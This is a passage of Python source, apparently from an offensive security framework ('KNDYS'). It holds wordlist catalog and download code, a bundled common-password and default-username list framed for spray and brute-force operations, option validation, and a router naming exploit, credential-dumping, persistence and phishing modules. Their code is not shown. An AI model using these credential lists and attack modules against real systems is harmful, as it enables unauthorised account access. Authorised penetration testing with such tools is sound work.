    def _rebuild_master_wordlists(self, categories=None):
        if not self.wordlists.get('wordlist_catalog'):
            return
        categories = categories or list(self.master_wordlists.keys())
        catalog = self.wordlists.get('wordlist_catalog', [])
        for category in categories:
            master_path = self.master_wordlists.get(category)
            if not master_path:
                continue
            master_path.parent.mkdir(parents=True, exist_ok=True)
            tmp_path = master_path.with_suffix(master_path.suffix + '.tmp')
            try:
                with open(tmp_path, 'w', encoding='utf-8') as dest:
                    for entry in catalog:
                        if entry.get('category') != category:
                            continue
                        if self.master_catalog_entries.get(category) is entry:
                            continue
                        source_path = entry.get('path')
                        if not source_path:
                            continue
                        source_path = Path(source_path)
                        if not source_path.exists():
                            continue
                        try:
                            with open(source_path, 'r', encoding='utf-8', errors='ignore') as src:
                                for line in src:
                                    stripped = line.rstrip('\r\n')
                                    if not stripped:
                                        continue
                                    dest.write(stripped + '\n')
                        except OSError:
                            continue
                os.replace(tmp_path, master_path)
            except OSError:
                try:
                    tmp_path.unlink(missing_ok=True)
                except Exception:
                    pass
                continue
            self._refresh_master_wordlist_entry(category)

    def _get_profile_entries(self, profile_key, profile_name, default_list):
        profiles = self.wordlists.get(profile_key, {}) if hasattr(self, 'wordlists') else {}
        profile_name = (profile_name or 'core').lower()
        if profiles.get(profile_name):
            return profiles[profile_name]
        return profiles.get('core') or list(default_list or [])

    def initialize_wordlists(self):
        """Initialize common wordlists and catalog popular libraries"""
        common_passwords = [
            '123456', '123456789', '12345678', '12345', '1234', '123', '123123',
            '123qwe', '111111', '121212', '654321', '666666', '7777777', '888888',
            '999999', 'abc123', 'access', 'adidas', 'admin', 'admin123',
            'administrator', 'apple', 'baseball', 'batman', 'charlie', 'computer',
            'dragon', 'football', 'freedom', 'hello', 'iloveyou', 'letmein',
            'master', 'michael', 'monkey', 'mustang', 'password', 'password1',
            'password123', 'passw0rd', 'pokemon', 'qazwsx', 'qwerty', 'qwerty123',
            'qwertyuiop', 'shadow', 'starwars', 'sunshine', 'trustno1', 'welcome'
        ]

        password_profiles = {
            'core': self._load_bundled_wordlist_file('kndys-passwords-core.txt', common_passwords),
            'enterprise': self._load_bundled_wordlist_file('kndys-passwords-enterprise.txt', common_passwords),
            'webapp': self._load_bundled_wordlist_file('kndys-passwords-webapp.txt', common_passwords),
            'spray': self._load_bundled_wordlist_file('kndys-passwords-spray.txt', common_passwords),
            'iot': self._load_bundled_wordlist_file('kndys-passwords-iot.txt', common_passwords)
        }

        default_usernames = [
            'admin', 'administrator', 'root', 'user', 'test', 'guest',
            'info', 'webmaster', 'support', 'service', 'sysadmin',
            'operator', 'backup', 'postmaster', 'hostmaster', 'mail'
        ]

        username_profiles = {
            'core': self._load_bundled_wordlist_file('kndys-usernames-core.txt', default_usernames),
            'service': self._load_bundled_wordlist_file('kndys-usernames-service.txt', default_usernames)
        }

        credential_profiles = {
            'defaults': self._load_bundled_wordlist_file('kndys-credentials-defaults.txt', [])
        }

        self.wordlists = {
            'subdomains': [
                'www', 'mail', 'ftp', 'admin', 'webmail', 'server', 'ns1', 'ns2',
                'blog', 'api', 'dev', 'test', 'staging', 'secure', 'portal', 'vpn',
                'mx', 'smtp', 'pop', 'imap', 'web', 'en', 'es', 'fr', 'de', 'it'
            ],
            'directories': [
                'admin', 'administrator', 'backup', 'backups', 'bin', 'config',
                'configuration', 'css', 'data', 'db', 'database', 'doc', 'docs',
                'download', 'downloads', 'error', 'errors', 'images', 'img',
                'include', 'includes', 'index', 'js', 'lib', 'library', 'log',
                'logs', 'media', 'old', 'php', 'private', 'pub', 'public',
                'script', 'scripts', 'secret', 'secure', 'src', 'sql', 'static',
                'style', 'styles', 'tmp', 'temp', 'template', 'templates',
                'test', 'tests', 'upload', 'uploads', 'user', 'users', 'var',
                'web', 'webapp', 'webapps', 'wordpress', 'wp', 'wp-admin',
                'wp-content', 'wp-includes', 'xml', 'xsl'
            ],
            'passwords': password_profiles['core'],
            'password_profiles': password_profiles,
            'usernames': username_profiles['core'],
            'username_profiles': username_profiles,
            'credential_profiles': credential_profiles
        }

        catalogs = []
        catalogs.extend(self.build_password_wordlist_catalog())
        catalogs.extend(self.build_username_wordlist_catalog())
        catalogs.extend(self.build_credential_wordlist_catalog())

        self.wordlists['wordlist_catalog'] = catalogs
        self.wordlists['wordlist_index'] = {}

        for entry in catalogs:
            for alias in entry['aliases']:
                alias_key = alias.lower()
                index_entry = self.wordlists['wordlist_index'].setdefault(alias_key, {})
                index_entry[entry['category']] = entry
        self._register_master_wordlists()
        self._rebuild_master_wordlists()
    
    def build_password_wordlist_catalog(self):
        """Build catalog of well-known password wordlists"""
        base_dir = Path('wordlists')
        base_dir.mkdir(exist_ok=True)

        bundled_entries = [
            self._create_bundled_wordlist_entry(
                'password',
                'kndys-passwords-core.txt',
                ['kndys-core-passwords', 'kndys-core'],
                'KNDYS curated core credential set (top multi-locale passwords).'
            ),
            self._create_bundled_wordlist_entry(
                'password',
                'kndys-passwords-enterprise.txt',
                ['kndys-enterprise-passwords', 'kndys-enterprise'],
                'Seasonal and finance-themed enterprise passwords optimized for spray operations.'
            ),
            self._create_bundled_wordlist_entry(
                'password',
                'kndys-passwords-webapp.txt',
                ['kndys-webapp-passwords', 'kndys-web'],
                'Web and portal administration password patterns (admin123!, login@2024, etc.).'
            ),
            self._create_bundled_wordlist_entry(
                'password',
                'kndys-passwords-spray.txt',
                ['kndys-spray-passwords', 'kndys-spray'],
                'Low-volume spray-safe password set focused on seasonal and policy-compliant strings.'
            ),
            self._create_bundled_wordlist_entry(
                'password',
                'kndys-passwords-iot.txt',
                ['kndys-iot-passwords', 'kndys-iot'],
                'IoT and appliance default passwords for edge-device targeting.'
            ),
        ]

        catalog = bundled_entries + [
            {
                'category': 'password',
                'name': 'rockyou.txt',
                'aliases': ['rockyou', 'rockyou.txt'],
                'url': 'https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz',
                'compressed': 'tar.gz',
                'extract': 'rockyou.txt',
                'size': '139 MB',
                'description': 'RockYou leaked password corpus (SecLists).'
            },
            {
                'category': 'password',
                'name': 'password.lst',
                'aliases': ['john', 'john.lst', 'password.lst'],
                'url': 'https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/password.lst',
                'compressed': None,
                'extract': None,
                'size': '4.1 MB',
                'description': 'John the Ripper default password list.'
            },
            {
                'category': 'password',
                'name': 'xato-net-10-million-passwords-1000000.txt',
                'aliases': ['xato', 'xato1m', 'xato-net-1m'],
                'url': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt',
                'compressed': None,
                'extract': None,
                'size': '8.1 MB',
                'description': 'Top 1M passwords from the Xato corpus (SecLists).'
            },
            {
                'category': 'password',
                'name': 'darkweb2017_top-10000.txt',
                'aliases': ['darkweb2017', 'darkweb2017-top10000', 'darkweb2017_top-10000'],
                'url': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt',
                'compressed': None,
                'extract': None,
                'size': '82 KB',
                'description': 'Top 10k passwords observed in dark web leaks (SecLists).'
            }
        ]

        for entry in catalog:
            entry['path'] = base_dir / entry['name']
            entry['available'] = entry['path'].exists()

            # Also add alias without extension for convenience
            stem_alias = entry['name'].split('.')[0]
            if stem_alias.lower() not in [alias.lower() for alias in entry['aliases']]:
                entry['aliases'].append(stem_alias)

        return catalog

    def build_username_wordlist_catalog(self):
        """Catalog popular username lists"""
        base_dir = Path('wordlists')
        base_dir.mkdir(exist_ok=True)

        bundled_entries = [
            self._create_bundled_wordlist_entry(
                'username',
                'kndys-usernames-core.txt',
                ['kndys-core-usernames', 'kndys-usernames'],
                'KNDYS curated enterprise administrator usernames (exec, ops, it, dev).'
            ),
            self._create_bundled_wordlist_entry(
                'username',
                'kndys-usernames-service.txt',
                ['kndys-service-usernames', 'kndys-svc'],
                'Service and daemon account identifiers (svc_*, daemon_*, automation).'
            )
        ]

        catalog = bundled_entries + [
            {
                'category': 'username',
                'name': 'top-usernames-shortlist.txt',
                'aliases': ['top-usernames', 'usernames-top', 'top-usernames-shortlist'],
                'url': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt',
                'compressed': None,
                'extract': None,
                'size': '112 bytes',
                'description': 'Shortlist of the most common administrative usernames (SecLists).'
            },
            {
                'category': 'username',
                'name': 'cirt-default-usernames.txt',
                'aliases': ['cirt-usernames', 'default-usernames', 'cirt-default-usernames'],
                'url': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt',
                'compressed': None,
                'extract': None,
                'size': '11 KB',
                'description': 'CIRT compilation of default usernames across devices (SecLists).'
            },
            {
                'category': 'username',
                'name': 'xato-net-10-million-usernames.txt',
                'aliases': ['xato-usernames', 'xato-10m-users', 'xato-net-10-million-usernames'],
                'url': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/xato-net-10-million-usernames.txt',
                'compressed': None,
                'extract': None,
                'size': '81 MB',
                'description': 'Xato corpus of usernames sourced from public breaches (SecLists).'
            }
        ]

        for entry in catalog:
            entry['path'] = base_dir / entry['name']
            entry['available'] = entry['path'].exists()

            stem_alias = entry['name'].split('.')[0]
            if stem_alias.lower() not in [alias.lower() for alias in entry['aliases']]:
                entry['aliases'].append(stem_alias)

        return catalog

    def build_credential_wordlist_catalog(self):
        """Catalog username:password combo lists"""
        base_dir = Path('wordlists')
        base_dir.mkdir(exist_ok=True)

        bundled_entries = [
            self._create_bundled_wordlist_entry(
                'credential',
                'kndys-credentials-defaults.txt',
                ['kndys-default-creds', 'kndys-creds'],
                'Curated default credential pairs covering infra, appliances, and SaaS platforms.'
            )
        ]

        catalog = bundled_entries + [
            {
                'category': 'credential',
                'name': 'ssh-betterdefaultpasslist.txt',
                'aliases': ['ssh-defaults', 'ssh-passlist', 'ssh-betterdefaultpasslist'],
                'url': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt',
                'compressed': None,
                'extract': None,
                'size': '2.0 KB',
                'description': 'Improved default SSH username:password list (SecLists).'
            },
            {
                'category': 'credential',
                'name': 'windows-betterdefaultpasslist.txt',
                'aliases': ['windows-defaults', 'windows-passlist', 'windows-betterdefaultpasslist'],
                'url': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/windows-betterdefaultpasslist.txt',
                'compressed': None,
                'extract': None,
                'size': '9.4 KB',
                'description': 'Default Windows admin credentials in username:password format (SecLists).'
            }
        ]

        for entry in catalog:
            entry['path'] = base_dir / entry['name']
            entry['available'] = entry['path'].exists()

            stem_alias = entry['name'].split('.')[0]
            if stem_alias.lower() not in [alias.lower() for alias in entry['aliases']]:
                entry['aliases'].append(stem_alias)

        return catalog

    def find_wordlist_entry(self, name, preferred_category=None):
        """Return catalog entry for an alias, optionally constrained by category"""
        if not name:
            return None

        lookup_values = {
            name.lower(),
            Path(name).name.lower(),
            Path(name).stem.lower()
        }

        index = self.wordlists.get('wordlist_index', {})

        for value in lookup_values:
            if value in index:
                category_map = index[value]
                if preferred_category and preferred_category in category_map:
                    return category_map[preferred_category]
                # Fallback to first available entry
                if category_map:
                    return next(iter(category_map.values()))

        return None

    def resolve_wordlist_path(self, name, category='password'):
        """Resolve a wordlist alias or path to a filesystem path"""
        if not name:
            return None

        candidate = Path(name).expanduser()
        if candidate.exists():
            return str(candidate)

        local_candidate = Path('wordlists') / Path(name).name
        if local_candidate.exists():
            return str(local_candidate)

        entry = self.find_wordlist_entry(name, category)
        if entry:
            if entry['path'].exists():
                return str(entry['path'])
            primary_alias = entry['aliases'][0] if entry['aliases'] else entry['name']
            print(f"{Fore.YELLOW}[!] Wordlist '{entry['name']}' ({entry['category']}) not downloaded yet. Use 'download wordlist {primary_alias}'{Style.RESET_ALL}")

        return None

    def _render_screen_header(self, title, tagline=None, width=70):
        """Render a screen header"""
        line = '━' * width
        label = f" {title.upper()} "
        label_line = label.center(width, '━')
        print(f"\n{Fore.MAGENTA}{Style.BRIGHT}┏{line}┓{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}┃{label_line}┃{Style.RESET_ALL}")
        if tagline:
            print(f"{Fore.MAGENTA}┃ {tagline}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}┗{line}┛{Style.RESET_ALL}\n")

    def show_wordlists(self):
        """Display extended password wordlist catalog"""
        catalog = self.wordlists.get('wordlist_catalog', [])

        if not catalog:
            print(f"{Fore.YELLOW} No wordlist catalog entries found{Style.RESET_ALL}")
            return

        grouped = {}
        for entry in catalog:
            grouped.setdefault(entry['category'], []).append(entry)

        self._render_screen_header(
            "Wordlist Archive",
            "sync credential arsenals for spray / brute ops"
        )

        for category, entries in sorted(grouped.items()):
            header = f"{category.upper()} · {len(entries)} feeds"
            print(f"{Fore.CYAN}┌─[{header}]{Style.RESET_ALL}")
            for entry in sorted(entries, key=lambda e: e['name'].lower()):
                status_icon = f"{Fore.GREEN}●{Style.RESET_ALL}" if entry['available'] else f"{Fore.RED}○{Style.RESET_ALL}"
                aliases = ', '.join(sorted(set(entry['aliases']), key=lambda a: (len(a), a))[:3])
                print(
                    f"{Fore.WHITE}│ {status_icon} {Fore.YELLOW}{entry['name']:<32}{Fore.WHITE}[{entry['size']}]"
                    f" {Fore.BLUE}{entry['description']}{Style.RESET_ALL}"
                )
                print(f"{Fore.WHITE}│ aliases :: {Fore.CYAN}{aliases}{Style.RESET_ALL}")
                source_line = 'bundled with KNDYS' if entry.get('bundled') else entry['url']
                print(f"{Fore.WHITE}│ source :: {Fore.GREEN}{source_line}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}└{'─'*68}{Style.RESET_ALL}\n")

        print(f"{Fore.CYAN}▸ sync :: {Fore.GREEN}download wordlist <alias>{Style.RESET_ALL}")
        print(f"{Fore.CYAN}▸ op :: {Fore.GREEN}use password/spray_attack → set usernames/passwords{Style.RESET_ALL}\n")

    def download_wordlist(self, name):
        """Download and prepare a wordlist (passwords, usernames, or credentials)"""
        entry = self.find_wordlist_entry(name)

        if not entry:
            print(f"{Fore.RED} Unknown wordlist: {Fore.WHITE}{name}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}ℹ Use {Fore.CYAN}show wordlists{Fore.BLUE} to see available lists{Style.RESET_ALL}")
            return

        if entry.get('bundled'):
            if entry['path'].exists():
                print(f"{Fore.GREEN} Bundled wordlist available locally{Style.RESET_ALL}")
                print(f"{Fore.CYAN} → {entry['path']}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Bundled wordlist missing: {entry['name']}{Style.RESET_ALL}")
                print(f"{Fore.BLUE}ℹ Ensure repository assets under 'wordlists/' are intact.{Style.RESET_ALL}")
            entry['available'] = entry['path'].exists()
            return

        if entry['path'].exists():
            print(f"{Fore.GREEN} Wordlist already available{Style.RESET_ALL}")
            print(f"{Fore.CYAN} → {entry['path']}{Style.RESET_ALL}")
            entry['available'] = True
            return

        print(f"\n{Fore.CYAN}┌─[ DOWNLOAD INFO ]──────────────────────────────{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ Name : {Fore.YELLOW}{entry['name']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ Type : {Fore.MAGENTA}{entry['category'].upper()}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ Size : {Fore.CYAN}{entry['size']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ Source : {Fore.BLUE}{entry['url'][:50]}...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}└────────────────────────────────────────────────{Style.RESET_ALL}\n")

        confirm = input(f"{Fore.YELLOW}Download now? (y/N): {Style.RESET_ALL}").strip().lower()
        if confirm != 'y':
            print(f"{Fore.YELLOW}⊘ Download cancelled{Style.RESET_ALL}")
            return

        tmp_path = entry['path'].with_suffix(entry['path'].suffix + '.download')
        cleanup_tmp = True

        try:
            print(f"{Fore.CYAN}⟳ Downloading...{Style.RESET_ALL}")
            response = requests.get(entry['url'], stream=True, timeout=120)
            response.raise_for_status()

            total_size = int(response.headers.get('content-length', 0))
            downloaded = 0

            with open(tmp_path, 'wb') as tmp_file:
                for chunk in response.iter_content(chunk_size=1024 * 1024):
                    if chunk:
                        tmp_file.write(chunk)
                        downloaded += len(chunk)
                        if total_size > 0:
                            percent = (downloaded / total_size) * 100
                            print(f"\r{Fore.CYAN}⟳ Progress: {percent:.1f}% ({downloaded // (1024*1024)}MB / {total_size // (1024*1024)}MB){Style.RESET_ALL}", end='')
            print() # New line after progress

            compressed = entry.get('compressed')

            if compressed == 'tar.gz':
                with tarfile.open(tmp_path, 'r:gz') as tar:
                    target_name = entry.get('extract') or entry['name']
                    member = next((m for m in tar.getmembers() if Path(m.name).name == target_name), None)
                    if not member:
                        raise ValueError(f"Target file {target_name} not found in archive")
                    extracted = tar.extractfile(member)
                    if not extracted:
                        raise ValueError(f"Could not extract {target_name}")
                    with open(entry['path'], 'wb') as dst:
                        shutil.copyfileobj(extracted, dst)
                tmp_path.unlink(missing_ok=True)

            elif compressed in ('gz', 'gzip'):
                with gzip.open(tmp_path, 'rb') as src, open(entry['path'], 'wb') as dst:
                    shutil.copyfileobj(src, dst)
                tmp_path.unlink(missing_ok=True)

            elif compressed == 'zip':
                with zipfile.ZipFile(tmp_path, 'r') as zipf:
                    target_name = entry.get('extract') or entry['name']
                    member = next((info for info in zipf.infolist() if Path(info.filename).name == target_name), None)
                    if not member:
                        raise ValueError(f"Target file {target_name} not found in archive")
                    with zipf.open(member, 'r') as src, open(entry['path'], 'wb') as dst:
                        shutil.copyfileobj(src, dst)
                tmp_path.unlink(missing_ok=True)

            else:
                os.replace(tmp_path, entry['path'])
                cleanup_tmp = False

            entry['available'] = entry['path'].exists()

            if entry['available']:
                file_size = entry['path'].stat().st_size / (1024 * 1024)
                print(f"{Fore.GREEN} Download complete!{Style.RESET_ALL}")
                print(f"{Fore.CYAN} → Location: {Fore.WHITE}{entry['path']}{Style.RESET_ALL}")
                print(f"{Fore.CYAN} → Size: {Fore.WHITE}{file_size:.1f} MB{Style.RESET_ALL}")
                print(f"{Fore.BLUE}ℹ Ready to use with alias: {Fore.GREEN}{entry['aliases'][0]}{Style.RESET_ALL}")
                if entry['category'] in self.master_wordlists:
                    self._rebuild_master_wordlists([entry['category']])
            else:
                print(f"{Fore.YELLOW} Download completed but file not accessible{Style.RESET_ALL}")

        except Exception as e:
            print(f"\n{Fore.RED} Download failed: {Fore.WHITE}{str(e)}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}ℹ Check your internet connection and try again{Style.RESET_ALL}")
        finally:
            if cleanup_tmp and tmp_path.exists():
                try:
                    tmp_path.unlink()
                except Exception:
                    pass

    def show_modules(self, category=None):
        """Display available modules"""
        self._render_screen_header(
            "Operations Library",
            "enumerate vectors, payload chains, and attack surfaces"
        )
        
        def render_block(cat_name, modules):
            ordered = sorted(modules.items(), key=lambda item: item[0])
            header = f"{cat_name.upper()} :: {len(ordered)} modules"
            print(f"{Fore.CYAN}┌─[{header}]{Style.RESET_ALL}")
            for idx, (module_name, module_info) in enumerate(ordered, 1):
                print(
                    f"{Fore.WHITE}│ {idx:02d} » {Fore.GREEN}{module_name:<20}{Fore.WHITE}"
                    f"// {module_info['description']}{Style.RESET_ALL}"
                )
            print(f"{Fore.CYAN}└{'─'*68}{Style.RESET_ALL}")

        if category and category in self.modules:
            render_block(category, self.modules[category])
        else:
            for idx, (category_name, modules) in enumerate(sorted(self.modules.items(), key=lambda item: item[0])):
                if idx:
                    print()
                render_block(category_name, modules)
    
    def use_module(self, module_path):
        """Select a module to use"""
        category = None
        module_name = None
        
        # Parse module path
        if '/' in module_path:
            parts = module_path.split('/')
            if len(parts) == 2:
                category, module_name = parts
        else:
            # Search in all categories
            for cat, modules in self.modules.items():
                if module_path in modules:
                    category = cat
                    module_name = module_path
                    break
        
        if not category or not module_name:
            print(f"{Fore.RED} Module not found: {Fore.WHITE}{module_path}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}ℹ Use {Fore.CYAN}show modules{Fore.BLUE} to list available modules{Style.RESET_ALL}")
            return False
        
        self.current_module = f"{category}/{module_name}"
        self.module_options = self.modules[category][module_name]['options'].copy()
        
        print(f"{Fore.GREEN} Module loaded: {Fore.CYAN}{self.current_module}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}→ {self.modules[category][module_name]['description']}{Style.RESET_ALL}")
        
        self.show_options()
        return True
    
    def show_options(self):
        """Show current module options"""
        if not self.current_module:
            print(f"{Fore.RED} No module selected{Style.RESET_ALL}")
            return

        self._render_screen_header(
            f"Module Vector :: {self.current_module}",
            "tune parameters before initiating the run"
        )

        print(f"{Fore.CYAN}{'parameter':<24}│{'value':<36}│ notes{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'─'*24}┼{'─'*36}┼{'─'*20}{Style.RESET_ALL}")
        for option, value in self.module_options.items():
            note = 'set' if str(value).strip() else 'pending'
            note_color = Fore.GREEN if note == 'set' else Fore.YELLOW
            print(
                f"{Fore.GREEN}{option:<24}{Fore.WHITE}│ {value:<36}│ {note_color}{note.upper()}{Style.RESET_ALL}"
            )
        print()
    
    def set_option(self, option, value):
        """Set module option with validation"""
        if not self.current_module:
            print(f"{Fore.RED} No module selected{Style.RESET_ALL}")
            return
        
        if option not in self.module_options:
            print(f"{Fore.RED} Invalid option: {Fore.WHITE}{option}{Style.RESET_ALL}")
            available = ', '.join(list(self.module_options.keys())[:5])
            print(f"{Fore.BLUE}ℹ Available options: {Fore.CYAN}{available}{Style.RESET_ALL}")
            return
        
        # Validate input based on option type
        validated_value = self._validate_option_value(option, value)
        if validated_value is None:
            print(f"{Fore.RED} Invalid value for {option}: {value}{Style.RESET_ALL}")
            return
        
        self.module_options[option] = validated_value
        print(f"{Fore.GREEN} {option} {Fore.WHITE}→ {Fore.CYAN}{validated_value}{Style.RESET_ALL}")
    
    def _validate_option_value(self, option, value):
        """Validate option value based on type"""
        # Common validation patterns
        if option in ['target', 'rhost', 'lhost']:
            # Validate IP or hostname (optionally with :port suffix)
            value = value.strip()
            hostname_pattern = r'^[a-zA-Z0-9.-]+$'

            if self.validator.validate_ip(value) or re.match(hostname_pattern, value):
                return value

            if ':' in value and not value.lower().startswith(('http://', 'https://')):
                host_part, port_part = value.rsplit(':', 1)
                host_part = host_part.strip()
                port_part = port_part.strip()
                if host_part and self.validator.validate_port(port_part):
                    if self.validator.validate_ip(host_part) or re.match(hostname_pattern, host_part):
                        return value

            print(f"{Fore.YELLOW}[!] Invalid IP/hostname format{Style.RESET_ALL}")
            return None
        
        elif option in ['port', 'rport', 'lport']:
            # Validate port
            if self.validator.validate_port(value):
                return value
            print(f"{Fore.YELLOW}[!] Port must be between 1-65535{Style.RESET_ALL}")
            return None
        
        elif option == 'url':
            # Validate URL
            if self.validator.validate_url(value):
                return value
            print(f"{Fore.YELLOW}[!] Invalid URL format (must include http:// or https://){Style.RESET_ALL}")
            return None
        
        elif option == 'email':
            # Validate email
            if self.validator.validate_email(value):
                return value
            print(f"{Fore.YELLOW}[!] Invalid email format{Style.RESET_ALL}")
            return None
        
        elif option in ['threads', 'timeout', 'count', 'delay']:
            # Validate numeric
            try:
                num_value = int(value)
                if num_value > 0:
                    return value
                print(f"{Fore.YELLOW}[!] Value must be positive{Style.RESET_ALL}")
                return None
            except ValueError:
                print(f"{Fore.YELLOW}[!] Value must be a number{Style.RESET_ALL}")
                return None
        
        elif option == 'path':
            # Validate and sanitize path
            sanitized = self.validator.sanitize_path(value)
            if sanitized:
                return sanitized
            print(f"{Fore.YELLOW}[!] Invalid path (no directory traversal allowed){Style.RESET_ALL}")
            return None
        
        # Default: accept value as-is
        return value
    
    # ============ MODULE IMPLEMENTATIONS ============
    
    def run_module(self):
        """Execute the current module"""
        if not self.current_module:
            print(f"{Fore.RED} No module selected{Style.RESET_ALL}")
            print(f"{Fore.BLUE}ℹ Use {Fore.CYAN}use <module>{Fore.BLUE} to select a module{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}{'═'*50}{Style.RESET_ALL}")
        print(f"{Fore.CYAN} Executing: {Fore.WHITE}{self.current_module}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*50}{Style.RESET_ALL}\n")
        self.logger.log(f"Running module: {self.current_module}")
        
        # Parse category and module name
        parts = self.current_module.split('/')
        if len(parts) == 2:
            category, module_name = parts
        else:
            print(f"{Fore.RED}[!] Invalid module format{Style.RESET_ALL}")
            return
        
        # Route to appropriate module handler
        module_handlers = {
            # Recon modules
            'port_scanner': self.run_port_scanner,
            'subdomain_scanner': self.run_subdomain_scanner,
            'web_crawler': self.run_web_crawler,
            'network_mapper': self.run_network_mapper,
            'os_detection': self.run_os_detection,
            
            # Scan modules
            'vuln_scanner': self.run_vuln_scanner,
            'sql_scanner': self.run_sql_scanner,
            'xss_scanner': self.run_xss_scanner,
            'ssl_scanner': self.run_ssl_scanner,
            'dir_traversal': self.run_dir_traversal,
            'csrf_scanner': self.run_csrf_scanner,
            
            # Exploit modules
            'multi_handler': self.run_multi_handler,
            'sql_injection': self.run_sql_injection,
            'xss_exploit': self.run_xss_exploit,
            'command_injection': self.run_command_injection,
            'file_upload': self.run_file_upload,
            'buffer_overflow': self.run_buffer_overflow,
            
            # Password modules
            'brute_force': self.run_brute_force,
            'hash_cracker': self.run_hash_cracker,
            'spray_attack': self.run_spray_attack,
            'credential_stuffing': self.run_credential_stuffing,
            
            # Post-exploitation modules
            'shell': self.run_shell,
            'file_explorer': self.run_file_explorer,
            'privilege_escalation': self.run_privilege_escalation,
            'credential_dumper': self.run_credential_dumper,
            'persistence': self.run_persistence,
            'pivot': self.run_pivot,
            
            # Wireless modules
            'wifi_scanner': self.run_wifi_scanner,
            'wifi_cracker': self.run_wifi_cracker,
            'rogue_ap': self.run_rogue_ap,
            
            # Social engineering modules
            'phishing': self.run_phishing,
            'credential_harvester': self.run_credential_harvester,
            'website_cloner': self.run_website_cloner,
            'mass_mailer': self.run_mass_mailer,
            'qr_generator': self.run_qr_generator,
            'usb_payload': self.run_usb_payload,
            'fake_update': self.run_fake_update,
            'sms_spoofing': self.run_sms_spoofing,
            'pretexting': self.run_pretexting,
            
            # Network attack modules
            'arp_spoof': self.run_arp_spoof,
            'dns_spoof': self.run_dns_spoof,
            'dhcp_starvation': self.run_dhcp_starvation,
            'ssl_strip': self.run_ssl_strip,
            'packet_sniffer': self.run_packet_sniffer,
            
            # Web application modules
            'jwt_cracker': self.run_jwt_cracker,
            'api_fuzzer': self.run_api_fuzzer,
            'cors_scanner': self.run_cors_scanner,
            'nosql_injection': self.run_nosql_injection,
            'graphql_introspection': self.run_graphql_introspection,
            
            # Tools
            'report_generator': self.run_report_generator,
            'evidence_collector': self.run_evidence_collector,
        }
        
        if module_name in module_handlers:
            try:
                # Execute module with proper error handling
                start_time = time.time()
                module_handlers[module_name]()
                elapsed = time.time() - start_time
                
                print(f"\n{Fore.GREEN} Module completed in {elapsed:.2f}s{Style.RESET_ALL}")
                self.logger.log(f"Module {module_name} completed successfully", "INFO")
                
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Module interrupted by user{Style.RESET_ALL}")
                self.logger.log(f"Module {module_name} interrupted", "WARNING")
                
            except ConnectionError as e:
                self.error_handler.handle_error(e, f"Connection error in {module_name}")
                
            except TimeoutError as e:
                self.error_handler.handle_error(e, f"Timeout in {module_name}")
                
            except PermissionError as e:
                self.error_handler.handle_error(e, f"Permission denied in {module_name}")
                print(f"{Fore.BLUE}ℹ Try running with sudo/administrator privileges{Style.RESET_ALL}")
                
            except ValueError as e:
                self.error_handler.handle_error(e, f"Invalid value in {module_name}")
                
            except Exception as e:
                self.error_handler.handle_error(e, f"Executing {module_name}", fatal=True)
                
        else:
            print(f"{Fore.YELLOW}[*] Module {module_name} not yet implemented{Style.RESET_ALL}")
    
    # ============ RECON MODULES ============
    
    def run_port_scanner(self):
        """Professional port scanner with advanced service detection and vulnerability checks"""
        target = self.module_options['target']
        ports_range = self.module_options['ports']
        threads = int(self.module_options.get('threads', 50))
        timeout = float(self.module_options.get('timeout', 2))
        scan_type = self.module_options.get('scan_type', 'tcp_connect')
        aggressive = self.module_options.get('aggressive', 'false').lower() == 'true'
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ PROFESSIONAL PORT SCANNER - KNDYS ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.WHITE}Target:{Style.RESET_ALL} {Fore.CYAN}{target}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Ports:{Style.RESET_ALL} {Fore.CYAN}{ports_range}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Scan Type:{Style.RESET_ALL} {Fore.CYAN}{scan_type}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Threads:{Style.RESET_ALL} {Fore.CYAN}{threads}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Timeout:{Style.RESET_ALL} {Fore.CYAN}{timeout}s{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Aggressive:{Style.RESET_ALL} {Fore.CYAN}{aggressive}{Style.RESET_ALL}\n")
        
        # Parse ports
        if '-' in ports_range:
            start, end = map(int, ports_range.split('-'))
            ports = list(range(start, end + 1))
        elif ',' in ports_range:
            ports = [int(p.strip()) for p in ports_range.split(',')]
        else:
            ports = [int(ports_range)]
        
        open_ports = []
        scan_results = {}
        vulnerabilities = []
        start_time = time.time()
        
